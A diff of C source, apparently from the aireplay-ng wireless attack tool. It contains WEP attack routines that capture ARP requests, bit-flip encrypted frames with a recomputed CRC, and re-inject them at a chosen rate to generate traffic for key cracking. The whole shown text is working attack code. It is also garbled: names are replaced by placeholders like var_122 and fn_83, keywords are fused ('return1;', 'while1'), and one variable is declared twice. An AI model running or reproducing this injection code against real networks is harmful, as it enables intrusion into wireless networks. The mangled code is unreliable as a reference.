+    {
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+            gettimeofday( &tv, NULL );
+            usleep( 122 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 122;
+            ticks[1] += f / 122;
+            ticks[2] += f / 122;
+        }
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rRead %ld packets (got %ld ARP requests and %ld ACKs), "
+                    "sent %ld packets...(%d pps)\r",
+                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)8192)) );
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 >= 1 )
+        {
+
+
+            ticks[2] = 0;
+
+            if( nb_arp > 0 )
+            {
+                if( nb_pkt_sent == 0 )
+                    ticks[0] = 0;
+
+                if( send_packet( arp[arp_off1].buf,
+                                 arp[arp_off1].len ) < 0 )
+                    return1;
+
+                if( ((double)ticks[0]/(double)8192)*(double)opt.r_nbpps > (double)nb_pkt_sent )
+                {
+                    if( send_packet( arp[arp_off1].buf,
+                                    arp[arp_off1].len ) < 0 )
+                        return1;
+                }
+
+                if( ++arp_off1 >= nb_arp )
+                    arp_off1 = 0;
+            }
+        }
+
+
+
+        if( opt.s_file == NULL )
+        {
+            gettimeofday( &tv, NULL );
+
+            var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+            if( var_117 < 0 ) return1;
+            if( var_117 == 0 ) continue;
+        }
+        else
+        {
+            var_122 = sizeof( pkh );
+
+            if( fread( &pkh, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
+                SWAP32( pkh.caplen );
+                SWAP32( pkh.len );
+            }
+
+            tv.tv_sec = pkh.tv_sec;
+            tv.tv_usec = pkh.tv_usec;
+
+            var_122 = var_117 = pkh.caplen;
+
+            if( var_122 <= 0 || var_122 > (int) sizeof( h80211 ) || var_122 > (int) sizeof( tmpbuf ) )
+            {
+                printf( "\r\33[KInvalid packet length %d.\n", var_122 );
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( fread( h80211, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
+            {
+
+
+                if( h80211[7] == 0x40 )
+                    var_122 = 64;
+                else
+                    var_122 = *(int *)( h80211 + 4 );
+
+                if( var_122 < 8 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
+            {
+
+
+                var_122 = *(unsigned short *)( h80211 + 2 );
+
+                if( var_122 <= 0 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
+            {
+
+
+                var_122 = le16_to_cpu(*(unsigned short *)( h80211 + 2));
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+
+                if ( var_122 == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
+                    var_122 = 32;
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+        }
+
+        nb_pkt_read++;
+
+
+
+        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
+            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
+        {
+            nb_bad_pkt++;
+
+            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
+            {
+                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
+                        "source MAC associated ?\n" );
+
+                tc = time( NULL );
+                nb_bad_pkt = 0;
+            }
+        }
+
+        if( h80211[0] == 0xD4 &&
+            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
+        {
+            nb_ack_pkt++;
+        }
+
+
+
+        opt.f_minlen = opt.f_maxlen = 68;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+            goto add_arp;
+
+        opt.f_minlen = opt.f_maxlen = 86;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+        {
+add_arp:
+            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                z+=2;
+
+            switch( h80211[1] & 3 )
+            {
+                case 1:
+                {
+
+
+                    memcpy( h80211 + 4, opt.f_bssid, 6 );
+                    memcpy( h80211 + 10, opt.r_smac, 6 );
+                    memcpy( h80211 + 16, opt.f_dmac, 6 );
+
+                    h80211[1] = 0x41;
+                }
+                case 2:
+                {
+                    if( opt.r_fromdsinj )
+                    {
+
+
+                        memcpy( h80211 + 4, opt.f_dmac, 6 );
+                        memcpy( h80211 + 10, opt.f_bssid, 6 );
+                        memcpy( h80211 + 16, opt.r_smac, 6 );
+
+                        h80211[1] = 0x42;
+                    }
+                    else
+                    {
+
+
+                        memcpy( h80211 + 4, opt.f_bssid, 6 );
+                        memcpy( h80211 + 10, opt.r_smac, 6 );
+                        memcpy( h80211 + 16, opt.f_dmac, 6 );
+
+                        h80211[1] = 0x41;
+                    }
+                }
+            }
+
+
+
+
+
+
+            for( var_122 = 0; var_122 < nb_arp; var_122++ )
+            {
+                if( memcmp( h80211 + z, arp[var_122].buf + arp[var_122].hdrlen, 4 ) == 0 )
+                    break;
+            }
+
+            if( var_122 < nb_arp )
+                continue;
+
+            if( var_117 > 128)
+                continue;
+
+
+            nb_arp_tot++;
+
+
+
+            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
+            {
+
+
+                memcpy( arp[arp_off2].buf, h80211, var_117 );
+                arp[arp_off2].len = var_117;
+                arp[arp_off2].hdrlen = z;
+
+                if( ++arp_off2 >= nb_arp )
+                    arp_off2 = 0;
+            } else {
+
+                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
+                    perror( "malloc failed" );
+                    return1;
+                }
+
+                memcpy( arp[nb_arp].buf, h80211, var_117 );
+                arp[nb_arp].len = var_117;
+                arp[nb_arp].hdrlen = z;
+                nb_arp++;
+
+                pkh.tv_sec = tv.tv_sec;
+                pkh.tv_usec = tv.tv_usec;
+                pkh.caplen = var_117;
+                pkh.len = var_117;
+
+                var_122 = sizeof( pkh );
+
+                if( fwrite( &pkh, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                var_122 = pkh.caplen;
+
+                if( fwrite( h80211, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                fflush( f_cap_out );
+            }
+        }
+    }
+
+    return0;
+}
+
+int fn_83( void )
+{
+    int nb_bad_pkt;
+    int arp_off1, arp_off2;
+    int var_122, var_122, var_117, nb_arp, z;
+    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;
+    unsigned char flip[4096];
+
+    time_t tc;
+    float f, ticks[3];
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    struct struct_99 *lt;
+
+    FILE *f_cap_out;
+    struct struct_122 pfh_out;
+    struct struct_95 pkh;
+    struct struct_85 * arp;
+
+
+
+    opt.f_type = 2;
+    opt.f_subtype = 0;
+    opt.f_iswep = 1;
+    opt.f_fromds = 0;
+
+    if(getnet(NULL, 1, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a BSSID (-b).\n" );
+        return1;
+    }
+
+
+    gettimeofday( &tv, NULL );
+
+    pfh_out.magic = TCPDUMP_MAGIC;
+    pfh_out.version_major = PCAP_VERSION_MAJOR;
+    pfh_out.version_minor = PCAP_VERSION_MINOR;
+    pfh_out.thiszone = 0;
+    pfh_out.sigfigs = 0;
+    pfh_out.snaplen = 65535;
+    pfh_out.linktype = LINKTYPE_IEEE802_11;
+
+    lt = localtime( (const time_t *) &tv.tv_sec );
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf, sizeof( strbuf ) - 1,
+              "replay_arp-%02d%02d-%02d%02d%02d.cap",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "Saving ARP requests in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return1;
+    }
+
+    var_122 = sizeof( struct struct_122 );
+
+    if( fwrite( &pfh_out, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed\n" );
+        return1;
+    }
+
+    fflush( f_cap_out );
+
+    printf( "You should also start airodump-ng to capture replies.\n" );
+
+    if(opt.port_in <= 0)
+    {
+
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+    }
+
+    if ( opt.ringbuffer )
+        arp = (struct struct_85*) malloc( opt.ringbuffer * sizeof( struct struct_85 ) );
+    else
+        arp = (struct struct_85*) malloc( sizeof( struct struct_85 ) );
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    tc = time( NULL ) - 11;
+
+    nb_pkt_read = 0;
+    nb_bad_pkt = 0;
+    nb_ack_pkt = 0;
+    nb_arp = 0;
+    nb_arp_tot = 0;
+    arp_off1 = 0;
+    arp_off2 = 0;
+
+    while1
+    {
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+            gettimeofday( &tv, NULL );
+            usleep( 122 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 122;
+            ticks[1] += f / 122;
+            ticks[2] += f / 122;
+        }
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rRead %ld packets (%ld ARPs, %ld ACKs), "
+                    "sent %ld packets...(%d pps)\r",
+                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)8192)) );
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 >= 1 )
+        {
+
+
+            ticks[2] = 0;
+
+            if( nb_arp > 0 )
+            {
+                if( nb_pkt_sent == 0 )
+                    ticks[0] = 0;
+
+                if( send_packet( arp[arp_off1].buf,
+                                 arp[arp_off1].len ) < 0 )
+                    return1;
+
+                if( ((double)ticks[0]/(double)8192)*(double)opt.r_nbpps > (double)nb_pkt_sent )
+                {
+                    if( send_packet( arp[arp_off1].buf,
+                                    arp[arp_off1].len ) < 0 )
+                        return1;
+                }
+
+                if( ++arp_off1 >= nb_arp )
+                    arp_off1 = 0;
+            }
+        }
+
+
+
+        if( opt.s_file == NULL )
+        {
+            gettimeofday( &tv, NULL );
+
+            var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+            if( var_117 < 0 ) return1;
+            if( var_117 == 0 ) continue;
+        }
+        else
+        {
+            var_122 = sizeof( pkh );
+
+            if( fread( &pkh, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
+                SWAP32( pkh.caplen );
+                SWAP32( pkh.len );
+            }
+
+            tv.tv_sec = pkh.tv_sec;
+            tv.tv_usec = pkh.tv_usec;
+
+            var_122 = var_117 = pkh.caplen;
+
+            if( var_122 <= 0 || var_122 > (int) sizeof( h80211 ) || var_122 > (int) sizeof( tmpbuf ) )
+            {
+                printf( "\r\33[KInvalid packet length %d.\n", var_122 );
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( fread( h80211, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
+            {
+
+
+                if( h80211[7] == 0x40 )
+                    var_122 = 64;
+                else
+                    var_122 = *(int *)( h80211 + 4 );
+
+                if( var_122 < 8 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
+            {
+
+
+                var_122 = *(unsigned short *)( h80211 + 2 );
+
+                if( var_122 <= 0 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
+            {
+
+
+                var_122 = le16_to_cpu(*(unsigned short *)( h80211 + 2));
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+
+                if ( var_122 == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
+                    var_122 = 32;
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+        }
+
+        nb_pkt_read++;
+
+
+
+        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
+            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
+        {
+            nb_bad_pkt++;
+
+            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
+            {
+                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
+                        "source MAC associated ?\n" );
+
+                tc = time( NULL );
+                nb_bad_pkt = 0;
+            }
+        }
+
+        if( h80211[0] == 0xD4 &&
+            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )
+        {
+            nb_ack_pkt++;
+        }
+
+
+
+        opt.f_minlen = opt.f_maxlen = 68;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+            goto add_arp;
+
+        opt.f_minlen = opt.f_maxlen = 86;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+        {
+add_arp:
+            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                z+=2;
+
+            switch( h80211[1] & 3 )
+            {
+                case 0:
+                {
+                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)
+                    {
+
+
+                        memcpy( h80211 + 4, BROADCAST, 6 );
+                        memcpy( h80211 + 10, opt.r_smac, 6 );
+                        memcpy( h80211 + 16, opt.f_bssid, 6 );
+
+                        h80211[1] = 0x40;
+                    }
+                    else
+                    {
+                        nb_arp_tot++;
+                        continue;
+                    }
+
+                    break;
+                }
+                case 1:
+                {
+                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)
+                    {
+
+
+                        memcpy( h80211 + 4, BROADCAST, 6 );
+                        memcpy( h80211 + 10, opt.f_bssid, 6 );
+                        memcpy( h80211 + 16, opt.f_bssid, 6 );
+
+                        h80211[1] = 0x42;
+                    }
+                    else
+                    {
+                        nb_arp_tot++;
+                        continue;
+                    }
+
+                    break;
+                }
+                default:
+                    continue;
+            }
+
+
+
+
+
+            for( var_122 = 0; var_122 < nb_arp; var_122++ )
+            {
+                if( memcmp( h80211 + z, arp[var_122].buf + arp[var_122].hdrlen, 4 ) == 0 )
+                    break;
+            }
+
+            if( var_122 < nb_arp )
+                continue;
+
+            if( var_117 > 128)
+                continue;
+
+
+            nb_arp_tot++;
+
+
+
+            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
+                continue;
+            else {
+
+                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
+                    perror( "malloc failed" );
+                    return1;
+                }
+
+                memset(flip, 0, 4096);
+
+
+
+                flip[z+21] ^= ((rand() % 255)+1);
+                flip[z+25] ^= ((rand() % 255)+1);
+
+                add_crc32_plain(flip, var_117-z-4-4);
+                for(var_122=0; var_122<var_117-z-4; var_122++)
+                    (h80211+z+4)[var_122] ^= flip[var_122];
+
+                memcpy( arp[nb_arp].buf, h80211, var_117 );
+                arp[nb_arp].len = var_117;
+                arp[nb_arp].hdrlen = z;
+                nb_arp++;
+
+                pkh.tv_sec = tv.tv_sec;
+                pkh.tv_usec = tv.tv_usec;
+                pkh.caplen = var_117;
+                pkh.len = var_117;
+
+                var_122 = sizeof( pkh );
+
+                if( fwrite( &pkh, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                var_122 = pkh.caplen;
+
+                if( fwrite( h80211, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                fflush( f_cap_out );
+            }
+        }
+    }
+
+    return0;
+}
+
+int fn_84( void )
+{
+    int nb_bad_pkt;
+    int arp_off1, arp_off2;
+    int var_122, var_122, var_117, nb_arp, z;
+    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;
+    unsigned char flip[4096];
+    unsigned char senderMAC[6];
+
+    time_t tc;
+    float f, ticks[3];
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    struct struct_99 *lt;
+
+    FILE *f_cap_out;
+    struct struct_122 pfh_out;
+    struct struct_95 pkh;
+    struct struct_85 * arp;
+
+    if ( opt.ringbuffer )
+        arp = (struct struct_85*) malloc( opt.ringbuffer * sizeof( struct struct_85 ) );
+    else
+        arp = (struct struct_85*) malloc( sizeof( struct struct_85 ) );
+
+
+
+    opt.f_type = 2;
+    opt.f_subtype = 0;
+    opt.f_iswep = 1;
+    opt.f_fromds = 1;
+
+    if(getnet(NULL, 1, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a BSSID (-b).\n" );
+        return1;
+    }
+
+
+    gettimeofday( &tv, NULL );
+
+    pfh_out.magic = TCPDUMP_MAGIC;
+    pfh_out.version_major = PCAP_VERSION_MAJOR;
+    pfh_out.version_minor = PCAP_VERSION_MINOR;
+    pfh_out.thiszone = 0;
+    pfh_out.sigfigs = 0;
+    pfh_out.snaplen = 65535;
+    pfh_out.linktype = LINKTYPE_IEEE802_11;
+
+    lt = localtime( (const time_t *) &tv.tv_sec );
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf, sizeof( strbuf ) - 1,
+              "replay_arp-%02d%02d-%02d%02d%02d.cap",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "Saving ARP requests in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return1;
+    }
+
+    var_122 = sizeof( struct struct_122 );
+
+    if( fwrite( &pfh_out, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed\n" );
+        return1;
+    }
+
+    fflush( f_cap_out );
+
+    printf( "You should also start airodump-ng to capture replies.\n" );
+    printf( "Remember to filter the capture to only keep WEP frames: ");
+    printf( " \"tshark -R 'wlan.wep.iv' -r capture.cap -w outcapture.cap\"\n");
+
+
+    if(opt.port_in <= 0)
+    {
+
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+    }
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    tc = time( NULL ) - 11;
+
+    nb_pkt_read = 0;
+    nb_bad_pkt = 0;
+    nb_ack_pkt = 0;
+    nb_arp = 0;
+    nb_arp_tot = 0;
+    arp_off1 = 0;
+    arp_off2 = 0;
+
+    while1
+    {
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+            gettimeofday( &tv, NULL );
+            usleep( 122 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 122;
+            ticks[1] += f / 122;
+            ticks[2] += f / 122;
+        }
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rRead %ld packets (%ld ARPs, %ld ACKs), "
+                    "sent %ld packets...(%d pps)\r",
+                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)8192)) );
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 >= 1 )
+        {
+
+
+            ticks[2] = 0;
+
+            if( nb_arp > 0 )
+            {
+                if( nb_pkt_sent == 0 )
+                    ticks[0] = 0;
+
+                if( send_packet( arp[arp_off1].buf,
+                                 arp[arp_off1].len ) < 0 )
+                    return1;
+
+                if( ((double)ticks[0]/(double)8192)*(double)opt.r_nbpps > (double)nb_pkt_sent )
+                {
+                    if( send_packet( arp[arp_off1].buf,
+                                    arp[arp_off1].len ) < 0 )
+                        return1;
+                }
+
+                if( ++arp_off1 >= nb_arp )
+                    arp_off1 = 0;
+            }
+        }
+
+
+
+        if( opt.s_file == NULL )
+        {
+            gettimeofday( &tv, NULL );
+
+            var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+            if( var_117 < 0 ) return1;
+            if( var_117 == 0 ) continue;
+        }
+        else
+        {
+            var_122 = sizeof( pkh );
+
+            if( fread( &pkh, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
+                SWAP32( pkh.caplen );
+                SWAP32( pkh.len );
+            }
+
+            tv.tv_sec = pkh.tv_sec;
+            tv.tv_usec = pkh.tv_usec;
+
+            var_122 = var_117 = pkh.caplen;
+
+            if( var_122 <= 0 || var_122 > (int) sizeof( h80211 ) || var_122 > (int) sizeof( tmpbuf ) )
+            {
+                printf( "\r\33[KInvalid packet length %d.\n", var_122 );
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( fread( h80211, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
+            {
+
+
+                if( h80211[7] == 0x40 )
+                    var_122 = 64;
+                else
+                    var_122 = *(int *)( h80211 + 4 );
+
+                if( var_122 < 8 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
+            {
+
+
+                var_122 = *(unsigned short *)( h80211 + 2 );
+
+                if( var_122 <= 0 || var_122 >= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
+            {
+
+
+                var_122 = le16_to_cpu(*(unsigned short *)( h80211 + 2));
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+
+                if ( var_122 == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
+                    var_122 = 32;
+
+                if( var_122 <= 0 || var_122>= (int) var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, var_117 );
+                var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, var_117 );
+            }
+        }
+
+        nb_pkt_read++;
+
+
+
+        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
+            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
+        {
+            nb_bad_pkt++;
+
+            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
+            {
+                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
+                        "source MAC associated ?\n" );
+
+                tc = time( NULL );
+                nb_bad_pkt = 0;
+            }
+        }
+
+        if( h80211[0] == 0xD4 &&
+            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )
+        {
+            nb_ack_pkt++;
+        }
+
+
+
+        opt.f_minlen = opt.f_maxlen = 68;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+            goto add_arp;
+
+        opt.f_minlen = opt.f_maxlen = 86;
+
+        if( filter_packet( h80211, var_117 ) == 0 )
+        {
+add_arp:
+            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                z+=2;
+
+            switch( h80211[1] & 3 )
+            {
+                case 2:
+                {
+                    if(memcmp(h80211 + 4, BROADCAST, 6) == 0)
+                    {
+
+
+                        memset( senderMAC, 0, 6 );
+                        memcpy( senderMAC, h80211 + 16, 6 );
+
+
+
+                        memcpy( h80211 + 4, opt.f_bssid, 6 );
+                        memcpy( h80211 + 10, opt.r_smac, 6 );
+                        memcpy( h80211 + 16, BROADCAST, 6 );
+
+                        h80211[1] = 0x41;
+                    }
+                    else
+                    {
+                        nb_arp_tot++;
+                        continue;
+                    }
+
+                    break;
+                }
+                default:
+                    continue;
+            }
+
+
+
+
+
+            for( var_122 = 0; var_122 < nb_arp; var_122++ )
+            {
+                if( memcmp( h80211 + z, arp[var_122].buf + arp[var_122].hdrlen, 4 ) == 0 )
+                    break;
+            }
+
+            if( var_122 < nb_arp )
+                continue;
+
+            if( var_117 > 128)
+                continue;
+
+
+            nb_arp_tot++;
+
+
+
+            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
+                continue;
+            else {
+
+                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
+                    perror( "malloc failed" );
+                    return1;
+                }
+
+                memset(flip, 0, 4096);
+
+
+                flip[16] ^= (opt.r_smac[0] ^ senderMAC[0]);
+                flip[17] ^= (opt.r_smac[1] ^ senderMAC[1]);
+                flip[18] ^= (opt.r_smac[2] ^ senderMAC[2]);
+                flip[19] ^= (opt.r_smac[3] ^ senderMAC[3]);
+                flip[20] ^= (opt.r_smac[4] ^ senderMAC[4]);
+                flip[21] ^= (opt.r_smac[5] ^ senderMAC[5]);
+                flip[25] ^= ((rand() % 255)+1);
+
+                add_crc32_plain(flip, var_117-z-4-4);
+                for(var_122=0; var_122<var_117-z-4; var_122++)
+                {
+                    (h80211+z+4)[var_122] ^= flip[var_122];
+                }
+
+                memcpy( arp[nb_arp].buf, h80211, var_117 );
+                arp[nb_arp].len = var_117;
+                arp[nb_arp].hdrlen = z;
+                nb_arp++;
+
+                pkh.tv_sec = tv.tv_sec;
+                pkh.tv_usec = tv.tv_usec;
+                pkh.caplen = var_117;
+                pkh.len = var_117;
+
+                var_122 = sizeof( pkh );
+
+                if( fwrite( &pkh, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                var_122 = pkh.caplen;
+
+                if( fwrite( h80211, var_122, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return1;
+                }
+
+                fflush( f_cap_out );
+            }
+        }
+    }
+
+    return0;
+}
+
+int fn_85(unsigned char *buf, unsigned char *smac, unsigned char *dmac)
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_ARP, 8);
+    buf[8] = 0x00;
+    buf[9] = 0x01;
+    buf[10] = 0x08;
+    buf[11] = 0x00;
+    buf[12] = 0x06;
+    buf[13] = 0x04;
+    buf[14] = 0x00;
+    if(memcmp(dmac, BROADCAST, 6) == 0)
+        buf[15] = 0x01;
+    else
+        buf[15] = 0x02;
+    memcpy(buf+16, smac, 6);
+
+    return 0;
+}
+
+int fn_86(unsigned char *buf, unsigned char *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+
+
+    buf[0] = 0x08;
+    buf[1] = 0x00;
+    buf[2] = 0x06;
+    buf[3] = 0x04;
+    buf[4] = 0x00;
+    buf[5] = 0x01;
+    memcpy(buf+6, mymac, 6);
+    buf[12] = 0xA9;
+    buf[13] = 0xFE;
+    buf[14] = 0x57;
+    buf[15] = 0xC5;
+
+    return 0;
+}
+
+int fn_87(unsigned char *buf, int var_89)
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_IP, 8);
+    buf[8] = 0x45;
+    buf[10] = (var_89 >> 8) & 0xFF;
+    buf[11] = var_89 & 0xFF;
+
+    return 0;
+}
+
+int fn_89(unsigned char *buf, unsigned char *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+
+
+    buf[0] = 0x06;
